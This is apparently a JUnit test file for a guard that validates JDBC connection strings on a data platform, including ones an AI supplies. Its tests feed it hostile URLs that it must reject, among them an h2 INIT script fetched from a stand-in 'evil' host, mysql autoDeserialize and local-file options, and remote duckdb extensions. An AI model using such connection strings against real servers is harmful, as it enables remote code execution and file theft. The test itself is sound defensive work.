package cn.crabc.core.app.mcp.support;

import cn.crabc.core.datasource.enums.ErrorStatusEnum;
import cn.crabc.core.datasource.exception.CustomException;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.test.util.ReflectionTestUtils;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * 数据源连接守卫测试。
 * <p>
 * 这组用例是「AI 不能把恶意 JDBC 连接串交给服务端执行」这条红线的保障：
 * 平台只把 jdbcUrl 原样交给连接池，h2 等嵌入式引擎可通过 INIT 参数直接执行代码。
 *
 * @author yuqf
 */
class DatasourceGuardTest {

    private final DatasourceGuard guard = new DatasourceGuard();

    @Test
    @DisplayName("数据源类型：白名单内通过，白名单外或为空被拒绝")
    void requireSupportedType() {
        assertEquals("mysql", guard.requireSupportedType(" MySQL "));
        assertEquals("custom", guard.requireSupportedType("custom"));

        assertEquals(ErrorStatusEnum.PARAM_NOT_FOUNT.getCode(),
                assertThrows(CustomException.class, () -> guard.requireSupportedType("h2")).getCode());
        assertEquals(ErrorStatusEnum.PARAM_NOT_FOUNT.getCode(),
                assertThrows(CustomException.class, () -> guard.requireSupportedType(" ")).getCode());
    }

    @Test
    @DisplayName("JDBC URL：允许网络型数据库协议")
    void allowNetworkDatabase() {
        assertDoesNotThrow(() -> guard.validateJdbcUrl("mysql", "jdbc:mysql://192.168.1.10:3306/orders"));
        assertDoesNotThrow(() -> guard.validateJdbcUrl("sqlserver", "jdbc:jtds:sqlserver://h:1433;databaseName=db"));
        assertDoesNotThrow(() -> guard.validateJdbcUrl("postgresql", "jdbc:postgresql://h:5432/db"));
    }

    @Test
    @DisplayName("JDBC URL：拒绝嵌入式/文件型引擎，防止服务端任意代码执行")
    void rejectEmbeddedEngine() {
        CustomException ex = assertThrows(CustomException.class,
                () -> guard.validateJdbcUrl("custom", "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'"));
        assertEquals(ErrorStatusEnum.FORBID_OPERATE.getCode(), ex.getCode());
        assertTrue(ex.getMsg().contains("h2"));

        assertThrows(CustomException.class, () -> guard.validateJdbcUrl("custom", "jdbc:hsqldb:mem:x"));
        assertThrows(CustomException.class, () -> guard.validateJdbcUrl("custom", "jdbc:sqlite:/tmp/x.db"));
    }

    @Test
    @DisplayName("JDBC URL：拒绝危险连接参数（h2 INIT / mysql autoDeserialize / 本地文件读取）")
    void rejectDangerousParameters() {
        assertThrows(CustomException.class, () -> guard.validateJdbcUrl("mysql",
                "jdbc:mysql://h:3306/db?autoDeserialize=true"));
        assertThrows(CustomException.class, () -> guard.validateJdbcUrl("mysql",
                "jdbc:mysql://h:3306/db?allowLoadLocalInfile=true"));
        assertThrows(CustomException.class, () -> guard.validateJdbcUrl("mysql",
                "jdbc:mysql://h:3306/db&queryInterceptors=com.evil.X"));
        assertThrows(CustomException.class, () -> guard.validateJdbcUrl("duckdb",
                "jdbc:duckdb:/tmp/x.db;extensions=http://evil/ext"));
    }

    @Test
    @DisplayName("JDBC URL：格式非法直接拒绝")
    void rejectMalformedUrl() {
        assertEquals(ErrorStatusEnum.FORBID_OPERATE.getCode(),
                assertThrows(CustomException.class, () -> guard.validateJdbcUrl("mysql", "192.168.1.10:3306")).getCode());
        assertEquals(ErrorStatusEnum.PARAM_NOT_FOUNT.getCode(),
                assertThrows(CustomException.class, () -> guard.validateJdbcUrl("mysql", "  ")).getCode());
    }

    @Test
    @DisplayName("内网拦截：默认关闭，开启后拒绝回环/内网地址")
    void blockInternalHost() {
        assertDoesNotThrow(() -> guard.validateJdbcUrl("mysql", "jdbc:mysql://127.0.0.1:3306/db"));

        ReflectionTestUtils.setField(guard, "blockInternalHost", true);
        assertThrows(CustomException.class, () -> guard.validateJdbcUrl("mysql", "jdbc:mysql://127.0.0.1:3306/db"));
        assertThrows(CustomException.class, () -> guard.validateJdbcUrl("mysql", "jdbc:mysql://10.1.2.3:3306/db"));
        assertDoesNotThrow(() -> guard.validateJdbcUrl("mysql", "jdbc:mysql://8.8.8.8:3306/db"));
    }

    @Test
    @DisplayName("协议白名单可配置覆盖")
    void configurableSchemes() {
        ReflectionTestUtils.setField(guard, "allowedSchemesConfig", "mysql, duckdb");
        assertEquals(2, guard.effectiveAllowedSchemes().size());
        assertThrows(CustomException.class, () -> guard.validateJdbcUrl("postgresql", "jdbc:postgresql://h:5432/db"));
        assertDoesNotThrow(() -> guard.validateJdbcUrl("duckdb", "jdbc:duckdb:/tmp/x.db"));
    }

    @Test
    @DisplayName("主机名提取：覆盖 // 与 @ 两种形态")
    void extractHost() {
        assertEquals("192.168.1.10", guard.extractHost("jdbc:mysql://192.168.1.10:3306/orders"));
        assertEquals("h", guard.extractHost("jdbc:sqlserver://h:1433;databaseName=db"));
        assertEquals("oracle-host", guard.extractHost("jdbc:oracle:thin:@oracle-host:1521:orcl"));
    }
}
